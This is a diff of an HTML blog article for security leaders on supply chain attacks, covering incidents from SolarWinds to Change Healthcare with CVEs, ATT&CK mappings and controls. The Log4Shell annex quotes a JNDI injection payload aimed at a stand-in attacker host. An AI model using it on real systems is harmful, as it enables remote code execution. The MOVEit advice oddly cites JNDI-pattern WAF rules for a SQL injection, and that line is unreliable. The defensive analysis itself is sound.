-    <p>Changing this requires something harder than changing processes: it requires changing the conversation with leadership about what the program is for. If the CISO thinks TPRM exists to pass audits, the program will be optimised for that. If they understand that TPRM should inform decisions about concentration risk, operational dependency, and supply chain exposure, you have a chance to build something that actually matters.</p>
+<hr class="article-divider"/>
 
-    <div class="review-note">[GABRIEL TO REVIEW] — This is a good place for a brief closing anecdote or observation from a real engagement — a moment where the intelligence-oriented approach surfaced something the compliance approach would have missed.</div>
+<!-- ============================================================ -->
+<!-- SECTION 2 — LANDMARK INCIDENTS                               -->
+<!-- ============================================================ -->
 
-    <hr class="article-divider"/>
+<h2>2. A Decade of Landmark Supply Chain Incidents</h2>
 
-    <p>The goal isn't to abolish questionnaires or discard compliance frameworks. They have a role. The goal is to stop treating them as a proxy for actual risk understanding. When something goes wrong through a third party — and it will — the question you'll face is: did your program actually tell you anything useful about this vendor, or did it just tell you that a box was checked? The answer to that question is the test of whether your TPRM program is real.</p>
+<h3>The big picture</h3>
 
-    <a class="back-link-bottom" href="index.html#blog">Back to Writing</a>
+<p>The landmark cases show the same recurring pattern: attackers do not always breach the final target directly. Instead, they compromise a <strong>trusted intermediary</strong> — software vendor, service provider, open-source maintainer, cloud integration, or remote management platform — and use that trust to scale the attack.</p>
 
-  </div>
+<h3>Why these incidents matter</h3>
 
-  <!-- FOOTER -->
-  <footer>
-    <span>&copy; 2026 Gabriel Hasik</span>
-    <span>Built with intention &middot; <a href="https://gabrielhasik.com">gabrielhasik.com</a></span>
-    <span>Cyber &middot; Risk &middot; Supply Chain</span>
-  </footer>
+<p>These cases are important not just because they were large, but because each one exposed a specific control failure that many organizations still have today:</p>
 
-</body>
-</html>
+<ul>
+  <li>over-trust in software updates,</li>
+  <li>insufficient build integrity assurance,</li>
+  <li>weak third-party access controls,</li>
+  <li>no visibility into software dependencies,</li>
+  <li>poor supplier concentration management,</li>
+  <li>and limited ability to assess sub-tier exposure.</li>
+</ul>
+
+<h3>Landmark incidents and the lesson each one teaches</h3>
+
+<table>
+  <thead>
+    <tr><th>Incident</th><th>What happened</th><th>Strategic lesson</th></tr>
+  </thead>
+  <tbody>
+    <tr><td><strong>SolarWinds (2020)</strong></td><td>Compromised build pipeline inserted malicious code into signed software updates</td><td>Trust in updates must be backed by <strong>build integrity controls</strong>, monitoring, and software provenance</td></tr>
+    <tr><td><strong>Kaseya VSA (2021)</strong></td><td>Exploited MSP tooling to push ransomware downstream</td><td>Remote management platforms create <strong>one-to-many blast radius</strong> and require extra governance</td></tr>
+    <tr><td><strong>Log4Shell (2021)</strong></td><td>Ubiquitous open-source library exposed vast numbers of systems</td><td><strong>SBOM visibility</strong> is essential for rapid exposure identification</td></tr>
+    <tr><td><strong>3CX (2023)</strong></td><td>A supply chain attack was itself initiated through another supply chain attack</td><td>Dependencies can be <strong>multi-layered</strong>, and risk extends beyond direct suppliers</td></tr>
+    <tr><td><strong>MOVEit (2023)</strong></td><td>Mass exploitation of a widely used file transfer platform</td><td>Shared platforms create <strong>concentration risk</strong> across entire sectors</td></tr>
+    <tr><td><strong>XZ Utils (2024)</strong></td><td>Long-term social engineering of an open-source maintainer nearly led to widespread compromise</td><td>Open-source trust models need <strong>integrity validation and ecosystem monitoring</strong></td></tr>
+    <tr><td><strong>Polyfill.io (2024)</strong></td><td>Domain takeover led to malicious script delivery at scale</td><td>External scripts should be protected with <strong>Subresource Integrity</strong> and dependency governance</td></tr>
+    <tr><td><strong>Change Healthcare (2024)</strong></td><td>Stolen credentials and lack of MFA caused systemic disruption in healthcare</td><td><strong>Basic access controls</strong> such as MFA and segmentation still prevent catastrophic outcomes</td></tr>
+    <tr><td><strong>Oracle / GitHub Actions / M&amp;S / Snowflake / npm cases (2025–2026)</strong></td><td>Legacy platforms, SaaS trust, CI/CD pipelines, and third-party helpdesks became attack paths</td><td>Supply chain defense must cover <strong>identity, CI/CD, SaaS, support workflows, and legacy estates</strong></td></tr>
+  </tbody>
+</table>
+
+<p>Full technical details for each incident — including CVEs, MITRE ATT&amp;CK mappings, attack chains, and specific prevention controls — are provided in <strong><a href="#annex-a">Annex A</a></strong>.</p>
+
+<h3>Executive interpretation</h3>
+
+<p>The incidents differ technically, but they repeat the same business story:</p>
+
+<ol>
+  <li>a trusted dependency is compromised,</li>
+  <li>detection is delayed,</li>
+  <li>the impact spreads to customers,</li>
+  <li>the customer often lacks immediate visibility,</li>
+  <li>regulators, customers, and media treat the customer as accountable anyway.</li>
+</ol>
+
+<p>That is why supply chain risk is no longer just a procurement or technology issue. It is a <strong>shared accountability problem</strong> across security, IT, architecture, legal, compliance, procurement, and business continuity.</p>
+
+<hr class="article-divider"/>
+
+<!-- ============================================================ -->
+<!-- SECTION 3 — HOW ATTACKERS COMPROMISE THE SUPPLY CHAIN        -->
+<!-- ============================================================ -->
+
+<h2>3. How Attackers Compromise the Supply Chain</h2>
+
+<h3>The big picture</h3>
+
+<p>Attackers increasingly prefer the supply chain because it is efficient. Instead of attacking one company at a time, they compromise something <strong>trusted and reusable</strong> — such as a software package, a remote management platform, an OAuth integration, or a build process — and let the trust relationship do the rest.</p>
+
+<h3>Why this matters for leadership</h3>
+
+<p>Understanding how attackers exploit the supply chain is not a technical exercise — it is a <strong>strategic planning input</strong>. Each attack method targets a different type of trust relationship. If leadership does not know which types of trust their organization depends on most, they cannot prioritize defenses, allocate budget, or ask the right questions of their teams and suppliers.</p>
+
+<p>The common factor across all methods is the same: <strong>attackers do not need to beat every control directly if they can abuse a trusted relationship already embedded in your environment.</strong></p>
+
+<h3>Supply chain attack methods at a glance</h3>
+
+<table>
+  <thead>
+    <tr><th>Attack method</th><th>What is exploited</th><th>Why it scales</th><th>Real-world example</th><th>Key defensive priority</th></tr>
+  </thead>
+  <tbody>
+    <tr><td><strong>CI/CD pipeline compromise</strong></td><td>The build and release process itself</td><td>Malicious code is distributed as legitimate software to all users</td><td>SolarWinds, Codecov, tj-actions</td><td>Build integrity, pipeline isolation, signed releases</td></tr>
+    <tr><td><strong>Dependency confusion &amp; typosquatting</strong></td><td>Package manager trust in names and versions</td><td>Malicious packages enter builds automatically, without conscious procurement</td><td>Alex Birsan PoC (35+ orgs), PhantomRaven</td><td>Private namespace controls, lock files, package allow-listing</td></tr>
+    <tr><td><strong>OAuth token compromise</strong></td><td>Persistent API-level trust between SaaS applications</td><td>One stolen token bypasses MFA and moves laterally across interconnected platforms</td><td>Salesloft/Drift (700+ orgs), Chrome extensions</td><td>App consent governance, least privilege, token monitoring</td></tr>
+    <tr><td><strong>Open-source poisoning</strong></td><td>Maintainer trust, social engineering, publishing credentials</td><td>Compromised libraries propagate to thousands of downstream projects</td><td>XZ Utils, xrpl.js, eslint-config-prettier, protestware</td><td>Dependency health monitoring, reproducible builds, SBOM</td></tr>
+    <tr><td><strong>MSP / supplier access compromise</strong></td><td>Privileged, persistent remote access to client environments</td><td>One compromised MSP gives access to hundreds of client networks</td><td>Kaseya, APT10 Cloud Hopper, M&amp;S via TCS</td><td>Zero trust for vendor access, MFA, segmentation, PAM</td></tr>
+  </tbody>
+</table>
+
+<h3>The typical attack path</h3>
+
+<p>While the technical details differ (see <strong><a href="#annex-b">Annex B</a></strong> for full technical breakdowns, MITRE ATT&amp;CK mappings, and specific controls), the business-level attack path is remarkably consistent:</p>
+
+<ol>
+  <li><strong>Identify a trusted intermediary</strong> — a software vendor, open-source library, managed service provider, SaaS integration, or CI/CD component that many organizations depend on.</li>
+  <li><strong>Compromise the intermediary</strong> — through vulnerability exploitation, credential theft, social engineering, or long-term infiltration of an open-source project.</li>
+  <li><strong>Inject malicious capability</strong> — into software updates, build artifacts, package registries, OAuth tokens, or remote management tools.</li>
+  <li><strong>Let trust do the distribution</strong> — the malicious payload spreads through normal business processes: software updates, automated builds, API integrations, or remote administration sessions.</li>
+  <li><strong>Exploit access at scale</strong> — exfiltrate data, deploy ransomware, steal credentials, or establish persistent access across dozens, hundreds, or thousands of downstream organizations simultaneously.</li>
+</ol>
+
+<p>The critical insight for leadership is that <strong>steps 3 and 4 happen inside trusted channels</strong>. Traditional perimeter defenses, endpoint controls, and even user-focused security awareness do not reliably catch threats that arrive through a legitimate software update, an authorized integration, or an approved vendor's remote session.</p>
+
+<h3>Executive interpretation</h3>
+
+<p>Five patterns emerge from the way attackers operate:</p>
+
+<ol>
+  <li><strong>Trust is the attack surface.</strong> Every trusted relationship — vendor access, software dependency, SaaS integration, build pipeline — is a potential entry point. The more trust an organization extends without verification, the larger its exposure.</li>
+  <li><strong>One compromise, many victims.</strong> The amplification effect is not accidental — it is the attacker's objective. Compromising a single MSP, library, or CI/CD action can provide access to hundreds or thousands of downstream targets simultaneously.</li>
+  <li><strong>Invisible entry, delayed detection.</strong> Because attacks arrive through trusted channels, they bypass many conventional detection mechanisms. Organizations often learn about the compromise from external notification, not internal monitoring.</li>
+  <li><strong>The risk extends beyond direct suppliers.</strong> Sub-tier dependencies, open-source maintainers, SaaS-to-SaaS integrations, and CI/CD components create exposure that most organizations do not map or monitor.</li>
+  <li><strong>Basic controls still prevent catastrophic outcomes.</strong> MFA, network segmentation, least-privilege access, dependency pinning, and build integrity verification would have prevented or significantly limited the majority of the incidents reviewed in this article.</li>
+</ol>
+
+<h3>Executive takeaway</h3>
+
+<p>If section 2 explained <em>why</em> the problem is serious, section 3 explains <em>why it scales</em>. The defensive implication is that supply chain security cannot be addressed by a single tool or team. It requires coordinated action across <strong>security architecture, software engineering, vendor management, identity governance, and incident response</strong> — with executive visibility into which trust relationships carry the most risk.</p>
+
+<hr class="article-divider"/>
+
+<!-- ============================================================ -->
+<!-- CONCLUSION                                                   -->
+<!-- ============================================================ -->
+
+<h2>Conclusion: The Supply Chain Is the Perimeter Now</h2>
+
+<p>The evidence leads to one conclusion: supply chain security is no longer a subcategory of cyber risk. It is now one of the <strong>primary ways enterprise risk materializes</strong>. When a third of breaches involve third parties, when one compromised dependency can ripple across thousands of organizations, and when regulators explicitly require supplier risk controls, traditional inside-out security thinking is no longer enough.</p>
+
+<p>For management, the real challenge is not whether the threat is serious — that is already clear. The challenge is operational maturity. Most organizations still struggle with the fundamentals:</p>
+
+<ul>
+  <li>incomplete supplier mapping,</li>
+  <li>limited visibility into sub-tier dependencies,</li>
+  <li>weak control over third-party access,</li>
+  <li>insufficient software transparency,</li>
+  <li>and under-tested response coordination with suppliers.</li>
+</ul>
+
+<p>The strategic priority for CISOs, ISOs, and resilience leaders should therefore be to move supply chain security into the same governance category as identity, vulnerability management, and incident response. It needs formal ownership, executive reporting, audit-ready evidence, and risk-based investment.</p>
+
+<p>Three priorities stand out:</p>
+
+<ol>
+  <li><strong>Visibility first</strong> — Map critical suppliers, privileged access paths, and software dependencies.</li>
+  <li><strong>Control trust relationships</strong> — Apply strong identity, segmentation, contractual controls, and continuous monitoring.</li>
+  <li><strong>Prepare for failure</strong> — Build supply chain incident playbooks, reporting readiness, and cross-functional exercises.</li>
+</ol>
+
+<p>Organizations that do these things will not avoid every breach. But they will be far better positioned to <strong>detect sooner, contain faster, report correctly, and defend their decisions</strong> when the next supply chain incident occurs.</p>
+
+<hr class="article-divider"/>
+
+<!-- ============================================================ -->
+<!-- ANNEX A — TECHNICAL INCIDENT DETAILS                         -->
+<!-- ============================================================ -->
+
+<div id="annex-a">
+  <span class="annex-label">Annex A</span>
+  <h2>Technical Incident Details</h2>
+
+  <h3>SolarWinds SUNBURST (2020) — The Attack That Changed Everything</h3>
+
+  <p>Russia's SVR (APT29/NOBELIUM) compromised SolarWinds' Orion Platform build system starting September 2019. Using a build-process implant called <strong>SUNSPOT</strong> (<code>taskhostsvc.exe</code>), attackers monitored <code>MsBuild.exe</code> processes and injected the <strong>SUNBURST</strong> backdoor into <code>SolarWinds.Orion.Core.BusinessLayer.dll</code>. The trojanized DLL was <strong>digitally signed</strong> with SolarWinds' legitimate certificate and distributed via routine updates (versions 2019.4 HF 5, 2020.2, 2020.2 HF 1).</p>
+
+  <p>SUNBURST employed a <strong>12–14 day dormancy period</strong>, a custom <strong>Domain Generation Algorithm</strong> for DNS-based C2 via <code>avsvmcloud[.]com</code>, and steganography for data exfiltration. It scanned for antivirus and forensic tools before activating. Second-stage payloads included <strong>TEARDROP</strong> (decoding a Cobalt Strike Beacon from a fake JPEG), <strong>RAINDROP</strong>, <strong>SUNSHUTTLE/GoldMax</strong>, and <strong>Sibot</strong>. Post-exploitation TTPs included <strong>SAML token forgery</strong> and IFEO debugger persistence.</p>
+
+  <p>FireEye discovered the breach on December 8, 2020, after detecting theft of its Red Team tools. <strong>~18,000 organizations</strong> downloaded compromised updates; approximately <strong>100 were actively targeted</strong>, including the US Departments of Treasury, State, Commerce, Homeland Security, and Energy. SolarWinds' stock dropped <strong>~40%</strong>; insured losses reached an estimated <strong>$90 million</strong>.</p>
+
+  <p><strong>Key CVE:</strong> CVE-2020-10148 (Orion API authentication bypass) — <a href="<https://nvd.nist.gov/vuln/detail/CVE-2020-10148>">NVD</a></p>
+
+  <p><strong>MITRE ATT&amp;CK techniques</strong> (Campaign C0024 — <a href="<https://attack.mitre.org/campaigns/C0024/>">source</a>):</p>
+  <ul>
+    <li>T1195.002 (Supply Chain Compromise: Compromise Software Supply Chain) — <a href="<https://attack.mitre.org/techniques/T1195/002/>">link</a></li>
+    <li>T1553.002 (Subvert Trust Controls: Code Signing) — <a href="<https://attack.mitre.org/techniques/T1553/002/>">link</a></li>
+    <li>T1606.002 (Forge Web Credentials: SAML Tokens) — <a href="<https://attack.mitre.org/techniques/T1606/002/>">link</a></li>
+    <li>T1568.002 (Dynamic Resolution: Domain Generation Algorithms) — <a href="<https://attack.mitre.org/techniques/T1568/002/>">link</a></li>
+  </ul>
+
+  <p><strong>Prevention:</strong> Build integrity verification with reproducible builds, egress filtering on build and monitoring servers, SAML token anomaly detection, and build environment isolation. <strong>ISO 27001:2022 Annex A Control A.5.21</strong> (ICT supply chain component integrity verification — <a href="<https://www.iso.org/standard/27001>">ISO</a>) and <strong>NIST CSF 2.0 GV.SC-07</strong> (ongoing supplier risk monitoring — <a href="<https://csf.tools/reference/nist-cybersecurity-framework/v2-0/gv/gv-sc/gv-sc-07/>">CSF Tools</a>) directly address build-process integrity.</p>
+
+  <hr class="article-divider"/>
+
+  <h3>Kaseya VSA (2021) — MSP Compromise at Scale</h3>
+
+  <p>REvil ransomware exploited zero-day vulnerabilities in Kaseya VSA on-premises servers on July 2, 2021 (Independence Day weekend). The attack chain: authentication bypass → payload upload → fake "Kaseya VSA Agent Hot-fix" pushed to all managed endpoints → PowerShell disabled Windows Defender → <code>certutil.exe</code> (LOLBin) decoded the encrypted payload → <strong>DLL sideloading</strong> using a vulnerable old <code>MsMpEng.exe</code> loading malicious <code>mpsvc.dll</code> → REvil encryption. The attack compromised <strong>~60 MSPs</strong> and <strong>800–1,500 downstream businesses</strong>, including Swedish supermarket chain Coop (800 stores closed for a week). REvil demanded <strong>$70 million</strong>; a universal decryptor was obtained July 22.</p>
+
+  <p><strong>Key CVEs:</strong></p>
+  <ul>
+    <li>CVE-2021-30116 (Authentication bypass) — <a href="<https://nvd.nist.gov/vuln/detail/CVE-2021-30116>">NVD</a></li>
+    <li>CVE-2021-30117 (SQL injection) — <a href="<https://nvd.nist.gov/vuln/detail/CVE-2021-30117>">NVD</a></li>
+    <li>CVE-2021-30118 (Remote code execution) — <a href="<https://nvd.nist.gov/vuln/detail/CVE-2021-30118>">NVD</a></li>
+    <li>CVE-2021-30119 (Cross-site scripting) — <a href="<https://nvd.nist.gov/vuln/detail/CVE-2021-30119>">NVD</a></li>
+    <li>CVE-2021-30120 (2FA bypass) — <a href="<https://nvd.nist.gov/vuln/detail/CVE-2021-30120>">NVD</a></li>
+  </ul>
+
+  <p><strong>MITRE ATT&amp;CK techniques:</strong></p>
+  <ul>
+    <li>T1190 (Exploit Public-Facing Application) — <a href="<https://attack.mitre.org/techniques/T1190/>">link</a></li>
+    <li>T1562.001 (Impair Defenses: Disable or Modify Tools) — <a href="<https://attack.mitre.org/techniques/T1562/001/>">link</a></li>
+    <li>T1574.002 (Hijack Execution Flow: DLL Side-Loading) — <a href="<https://attack.mitre.org/techniques/T1574/002/>">link</a></li>
+    <li>T1486 (Data Encrypted for Impact) — <a href="<https://attack.mitre.org/techniques/T1486/>">link</a></li>
+  </ul>
+
+  <p><strong>Prevention:</strong> Prompt patching of critical RMM vulnerabilities, network segmentation between MSP and client environments, endpoint detection on managed systems, and contractual security requirements. <strong>ISO 27001 A.5.22</strong> (monitoring supplier performance) and <strong>DORA Article 29</strong> (ICT concentration risk) — <a href="<https://www.digital-operational-resilience-act.com/Article_29.html>">DORA</a> — would have flagged sole-source MSP dependency.</p>
+
+  <hr class="article-divider"/>
+
+  <h3>Log4Shell (2021) — When SBOM Became Non-Negotiable</h3>
+
+  <p>CVE-2021-44228 (CVSS 10.0) — <a href="<https://nvd.nist.gov/vuln/detail/CVE-2021-44228>">NVD</a> — in Apache Log4j 2 exploited JNDI lookup functionality in logged messages. An attacker injecting <code>${jndi:ldap://attacker.com/malicious}</code> into any logged input triggered a remote class load and full RCE. Affected versions: log4j-core <strong>2.0-beta9 through 2.14.1</strong> (the vulnerability existed since 2013). Cascading fixes followed:</p>
+  <ul>
+    <li>CVE-2021-45046 (incomplete fix bypass, CVSS 9.0) — <a href="<https://nvd.nist.gov/vuln/detail/CVE-2021-45046>">NVD</a></li>
+    <li>CVE-2021-45105 (DoS) — <a href="<https://nvd.nist.gov/vuln/detail/CVE-2021-45105>">NVD</a></li>
+    <li>CVE-2021-44832 (config-based RCE) — <a href="<https://nvd.nist.gov/vuln/detail/CVE-2021-44832>">NVD</a></li>
+  </ul>
+
+  <p>Chen Zhaojun of Alibaba Cloud Security reported it privately on November 24, 2021; mass exploitation began December 9. <strong>93% of cloud enterprise environments</strong> were vulnerable (Wiz/EY); as of December 2022, <strong>25% of Log4j downloads</strong> still used vulnerable versions. The US DHS estimated full remediation would take <strong>at least a decade</strong>. Observed payloads included Kinsing cryptominer, Cobalt Strike, Mirai botnet, and Conti ransomware.</p>
+
+  <p>Log4Shell is the defining case for SBOM value: organizations with SBOMs identified exposure <strong>in minutes</strong> by querying for log4j-core versions 2.0–2.14.1. Without SBOMs, teams spent <strong>days to weeks</strong> manually auditing. This single incident accelerated enterprise SBOM adoption more than any regulation.</p>
+
+  <p><strong>Prevention:</strong> Maintain an SBOM in <a href="<https://spdx.dev>">SPDX</a> or <a href="<https://cyclonedx.org>">CycloneDX</a> format enabling rapid component inventory queries. Implement automated dependency scanning in CI/CD with tools such as <a href="<https://github.com/anchore/grype>">Grype</a> or <a href="<https://owasp.org/www-project-dependency-check/>">OWASP Dependency-Check</a>. Enforce network egress controls from application servers to block LDAP/RMI callbacks.</p>
+
+  <hr class="article-divider"/>
+
+  <h3>3CX (2023) — The First Cascading Supply Chain Attack</h3>
+
+  <p>North Korean state actors (Lazarus Group/UNC4736) executed the first publicly documented <strong>supply chain attack that originated from another supply chain attack</strong>. Attackers first compromised Trading Technologies' discontinued <strong>X_TRADER</strong> software, embedding the <strong>VEILEDSIGNAL</strong> backdoor. A 3CX employee downloaded the trojanized X_TRADER on a personal computer → VEILEDSIGNAL provided admin access → stolen VPN credentials → lateral movement into 3CX's Windows and macOS build environments.</p>
+
+  <p>Trojanized 3CX Desktop App versions deployed <strong>SUDDENICON</strong> (GitHub-based C2 retrieval), <strong>ICONICSTEALER</strong> (browser data theft), <strong>TAXHAUL</strong> (DLL persistence via IKEEXT service hijacking), <strong>COLDCAT</strong> (HTTPS C2), and <strong>Gopuram</strong> (targeted at cryptocurrency companies). The attack used <strong>SIGFLIP</strong> (<a href="<https://github.com/med0x2e/SigFlip>">source</a>) exploiting CVE-2013-3900 (<a href="<https://nvd.nist.gov/vuln/detail/CVE-2013-3900>">NVD</a>) for signature-preserving code injection. 3CX serves <strong>600,000+ customers and 12 million users</strong>.</p>
+
+  <p><strong>MITRE ATT&amp;CK Campaign C0057</strong> — <a href="<https://attack.mitre.org/campaigns/C0057/>">source</a></p>
+  <ul>
+    <li>T1195.002 (Supply Chain Compromise: Compromise Software Supply Chain) — <a href="<https://attack.mitre.org/techniques/T1195/002/>">link</a></li>
+    <li>T1574.001 (Hijack Execution Flow: DLL Search Order Hijacking) — <a href="<https://attack.mitre.org/techniques/T1574/001/>">link</a></li>
+    <li>T1620 (Reflective Code Loading) — <a href="<https://attack.mitre.org/techniques/T1620/>">link</a></li>
+  </ul>
+
+  <p><strong>Prevention:</strong> Binary-level verification of developer workstations and personal devices; zero trust policies preventing unmanaged devices from accessing build infrastructure; mandatory code signing with <a href="<https://www.sigstore.dev>">Sigstore</a> enabling tamper-evident artifact transparency. <strong>ISO 27001 A.5.21</strong> explicitly requires hardware and software component integrity verification throughout the ICT supply chain.</p>
+
+  <hr class="article-divider"/>
+
+  <h3>MOVEit Transfer (2023) — Mass Exploitation via SQL Injection</h3>
+
+  <p>Cl0p ransomware group exploited <strong>CVE-2023-34362</strong> (CVSS 9.8) — <a href="<https://nvd.nist.gov/vuln/detail/CVE-2023-34362>">NVD</a> — a SQL injection zero-day in Progress Software's MOVEit Transfer. The exploit manipulated the database to configure a trusted attacker-controlled identity provider, then forged a sysadmin JWT token. Cl0p deployed the <strong>LEMURLOOT</strong> web shell (<code>human2.aspx</code>), which required authentication via a hard-coded password in the <code>X-siLock-Comment</code> header. Kroll and GreyNoise found Cl0p had been <strong>testing the vulnerability since July 2021</strong>.</p>
+
+  <p>Additional CVEs followed:</p>
+  <ul>
+    <li>CVE-2023-35036 (SQL injection variant) — <a href="<https://nvd.nist.gov/vuln/detail/CVE-2023-35036>">NVD</a></li>
+    <li>CVE-2023-35708 (SQL injection variant) — <a href="<https://nvd.nist.gov/vuln/detail/CVE-2023-35708>">NVD</a></li>
+    <li>CVE-2023-36934 (authentication bypass) — <a href="<https://nvd.nist.gov/vuln/detail/CVE-2023-36934>">NVD</a></li>
+  </ul>
+
+  <p>Final tally: <strong>2,773+ organizations</strong> and approximately <strong>95.8 million individuals</strong> affected (<a href="<https://www.emsisoft.com/en/blog/44123/unpacking-the-moveit-breach-statistics-and-analysis/>">Emsisoft</a>). Estimated total cost: <strong>$12–16 billion</strong>. Cl0p notably <strong>did not deploy ransomware</strong> — they used pure data exfiltration and extortion. CISA advisory: <a href="<https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-158a>">AA23-158A</a></p>
+
+  <p><strong>MITRE ATT&amp;CK techniques:</strong></p>
+  <ul>
+    <li>T1190 (Exploit Public-Facing Application) — <a href="<https://attack.mitre.org/techniques/T1190/>">link</a></li>
+    <li>T1505.003 (Server Software Component: Web Shell) — <a href="<https://attack.mitre.org/techniques/T1505/003/>">link</a></li>
+    <li>T1078 (Valid Accounts) — <a href="<https://attack.mitre.org/techniques/T1078/>">link</a></li>
+  </ul>
+
+  <p><strong>Prevention:</strong> Web Application Firewall rules blocking JNDI-pattern payloads, strict parameterized queries, network segmentation isolating managed file transfer servers, and rapid patch application (Progress issued a patch on the day of public disclosure). <strong>NIS2 Article 21(2)(d)</strong> — <a href="<https://www.nis-2-directive.com/NIS_2_Directive_Article_21.html>">source</a> — mandates supply chain security practices that would require customers to vet a critical file transfer dependency; <strong>ISO 27001 A.5.22</strong> requires monitoring of suppliers when security incidents occur.</p>
+
+  <hr class="article-divider"/>
+
+  <h3>XZ Utils (2024) — A Two-Year Social Engineering Masterpiece</h3>
+
+  <p><strong>CVE-2024-3094</strong> (CVSS 10.0) — <a href="<https://nvd.nist.gov/vuln/detail/CVE-2024-3094>">NVD</a>. A developer using the pseudonym <strong>"Jia Tan"</strong> spent over two years contributing to XZ Utils, gradually gaining maintainer trust. Suspected sock puppet accounts pressured the original sole maintainer, exploiting open-source burnout. In February 2024, Jia Tan inserted a backdoor into XZ Utils versions <strong>5.6.0 and 5.6.1</strong> targeting <code>liblzma</code>.</p>
+
+  <p>The backdoor was hidden <strong>only in release tarballs</strong> (not the git repository), inside modified <code>build-to-host.m4</code> and obfuscated test files using RC4 encryption. At runtime, it exploited <strong>glibc's IFUNC mechanism</strong> to hook <strong>RSA_public_decrypt</strong> in OpenSSH (loaded via <code>sshd → libsystemd → liblzma</code>). The hooked function extracted commands from the RSA key's modulus, decrypted with <strong>ChaCha20</strong>, validated with a hard-coded <strong>Ed448 public key</strong>, and passed validated commands to <code>system()</code> — achieving <strong>pre-authentication RCE</strong>.</p>
+
+  <p>Microsoft engineer <strong>Andres Freund</strong> discovered it accidentally on March 28, 2024, after noticing <strong>500ms SSH login latency</strong> on a Debian Sid installation. Had it reached stable releases weeks later, it would have compromised <strong>hundreds of millions of production servers</strong>.</p>
+
+  <p><strong>MITRE ATT&amp;CK techniques:</strong></p>
+  <ul>
+    <li>T1195.002 (Supply Chain Compromise: Compromise Software Supply Chain) — <a href="<https://attack.mitre.org/techniques/T1195/002/>">link</a></li>
+    <li>T1574.006 (Hijack Execution Flow: Dynamic Linker Hijacking) — <a href="<https://attack.mitre.org/techniques/T1574/006/>">link</a></li>
+    <li>T1556 (Modify Authentication Process) — <a href="<https://attack.mitre.org/techniques/T1556/>">link</a></li>
+  </ul>
+
+  <p><strong>Prevention:</strong> Require reproducible builds for all release artifacts (<a href="<https://slsa.dev/spec/v1.0/levels>">SLSA Level 3</a>); audit release tarballs against git repository source with automated diffing tools; implement <a href="<https://securityscorecards.dev>">OpenSSF Scorecard</a> continuous health assessment for critical open-source dependencies; apply <code>libsystemd</code> privilege separation to isolate <code>sshd</code> from unnecessary shared libraries. This incident illustrates why <strong>NIS2 Article 22</strong> (coordinated risk assessment for critical ICT products — <a href="<https://www.nis-2-directive.com/NIS_2_Directive_Article_22.html>">source</a>) is crucial: EU-level identification of <code>liblzma</code> as critical infrastructure would have triggered enhanced integrity monitoring.</p>
+
+  <hr class="article-divider"/>
+
+  <h3>Polyfill.io (2024) — CDN Domain Takeover at Scale</h3>
+
+  <p>In February 2024, a Chinese CDN company called <strong>Funnull</strong> acquired the <code>polyfill.io</code> domain. The new operators injected <strong>malicious JavaScript</strong> targeting mobile users — redirecting them to sports betting and scam sites via a fake Google Analytics domain (<code>googie-anaiytics.com</code>). Evasion mechanisms included mobile-only targeting, admin cookie detection, analytics service detection, delayed execution, randomized triggering (~10% of sessions), and heavy obfuscation.</p>
+
+  <p><strong>384,773 hosts</strong> still embedded the malicious script as of July 2, 2024 (<a href="<https://censys.com/blog/july-2-polyfill-io-supply-chain-attack-digging-into-the-web-of-compromised-domains/>">Censys</a>). Affected sites included JSTOR, Intuit, WEF, Hulu, and Mercedes-Benz.</p>
+
+  <p><strong>MITRE ATT&amp;CK techniques:</strong></p>
+  <ul>
+    <li>T1584.001 (Acquire Infrastructure: Compromise Infrastructure — Domains) — <a href="<https://attack.mitre.org/techniques/T1584/001/>">link</a></li>
+    <li>T1480 (Execution Guardrails) — <a href="<https://attack.mitre.org/techniques/T1480/>">link</a></li>
+  </ul>
+
+  <p><strong>Prevention — the critical one-liner:</strong> Add Subresource Integrity (SRI) attributes to all externally loaded scripts. Example:</p>
+
+  <pre><code>&lt;script src="<https://cdn.example.com/library.js>"
+    integrity="sha384-[hash]"
+    crossorigin="anonymous"&gt;&lt;/script&gt;</code></pre>
+
+  <p>Browsers cryptographically reject tampered files before execution. This single control would have completely neutralized the Polyfill.io attack. The MDN SRI reference is at <a href="<https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity>">MDN</a>. Additional mitigation: adopt self-hosted alternatives (Cloudflare and Fastly both offered free replacements within 24 hours of disclosure). <strong>ISO 27001 A.5.21</strong> requires integrity verification of ICT components — SRI is the web-layer implementation of this control.</p>
+
+  <hr class="article-divider"/>
+
+  <h3>Change Healthcare (2024) — A Single Point of Failure for US Healthcare</h3>
+
+  <p>ALPHV/BlackCat ransomware affiliates used <strong>stolen credentials of a low-level customer support employee</strong> to access a <strong>Citrix remote access portal without MFA</strong> on February 12, 2024. Attackers spent <strong>9 days</strong> moving laterally through poorly segmented networks before deploying ransomware on February 21. UnitedHealth paid a <strong>$22 million Bitcoin ransom</strong> — which failed to protect data after ALPHV's leadership executed an exit scam, with the affiliate later engaging <strong>RansomHub</strong> for a second extortion attempt.</p>
+
+  <p>Change Healthcare processes <strong>15 billion healthcare transactions annually</strong> and handles <strong>1 in 3 US patient records</strong>. Final impact: <strong>192.7 million individuals</strong> (<a href="<https://www.hipaaguide.net/change-healthcare-data-breach/>">HIPAA Guide</a>) — nearly two-thirds of the US population and the <strong>largest healthcare data breach in history</strong>. Total costs reached <strong>$3.1 billion</strong> (UnitedHealth Q4 2024 earnings). An AHA survey of ~1,000 hospitals found <strong>74% reported direct patient care impact</strong> and <strong>94% reported financial impact</strong> (<a href="<https://www.aha.org/change-healthcare-cyberattack-underscores-urgent-need-strengthen-cyber-preparedness-individual-health-care-organizations-and>">AHA</a>).</p>
+
+  <p><strong>MITRE ATT&amp;CK techniques:</strong></p>
+  <ul>
+    <li>T1078 (Valid Accounts) — <a href="<https://attack.mitre.org/techniques/T1078/>">link</a></li>
+    <li>T1133 (External Remote Services) — <a href="<https://attack.mitre.org/techniques/T1133/>">link</a></li>
+    <li>T1486 (Data Encrypted for Impact) — <a href="<https://attack.mitre.org/techniques/T1486/>">link</a></li>
+  </ul>
+
